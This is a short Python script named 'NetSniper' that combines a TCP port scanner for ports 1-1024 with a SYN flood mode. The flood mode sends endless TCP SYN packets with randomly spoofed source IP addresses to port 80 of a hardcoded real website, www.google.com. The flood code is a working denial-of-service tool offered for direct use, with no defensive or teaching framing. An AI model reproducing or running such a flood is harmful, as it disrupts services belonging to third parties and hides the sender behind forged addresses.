#!/usr/bin/env python
import pyfiglet
import socket
import argparse
import sys
from scapy.all import *
from datetime import datetime

def tcp_syn(ip_address,sport,dport):
            s_addr = RandIP()
            d_addr = ip_address

            packet = IP(src=s_addr,dst=d_addr)/TCP(sport=sport,dport=dport,seq=1505066,flags="S")
            send(packet)





result = pyfiglet.figlet_format("<- NetSniper ->", font = "slant" )
print(result)
#print("    ############################\n    #                          #\n    #   ||\  || ============\  #\n    #   || \\ || Net          \ #\n    #   ||  \\|| Sniper       / #\n    #   ||   \\| ============/  #\n    #                          #\n    ############################   ")

parser = argparse.ArgumentParser()
parser.add_argument("Option", help="1. T for TCP port scanning\n2. A for SYN Flood Attack")
args  = parser.parse_args()


if args.Option == "T":
    print("\n    TCP Scan initiating")
elif args.Option =="A":
    print("\n    SYN Flood attack   ")
    while(True):
        tcp_syn("www.google.com",1234,80)
        args.Option = "E"
    



if args.Option == "E":
    sys.exit()


    
# Taking IP from user
remoteServer= input("\n\n    Enter a remote host to scan: ")
remoteServerIP= socket.gethostbyname(remoteServer)

# Printing a banner to show which IP we are scannning
print ("-" * 60)
print ("Please wait, scanning remote host", remoteServer)
print ("-" * 60)

# Check what time the scan started
t1 = datetime.now()


#Running for loop to scan ports from 1 to 1024

#We also put in some error handling for catching errors

try:
    for port in range(1,1025):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((remoteServerIP, port))
        if result == 0:
            print ("Port {}: 	 Open".format(port))
        else:
            print ("Port {}:     Closed".format(port))
        sock.close()

except KeyboardInterrupt:
    print ("You pressed Ctrl+C")
    sys.exit()

except socket.gaierror:
    print ('Hostname could not be resolved. Exiting')
    sys.exit()

except socket.error:
    print ("Couldn't connect to server")
    sys.exit()

# Checking the time again
t2 = datetime.now()

# Calculates the difference of time, to see how long it took to run the script
total =  t2 - t1

# Printing the information to screen
print ('Scanning Completed in: ', total)
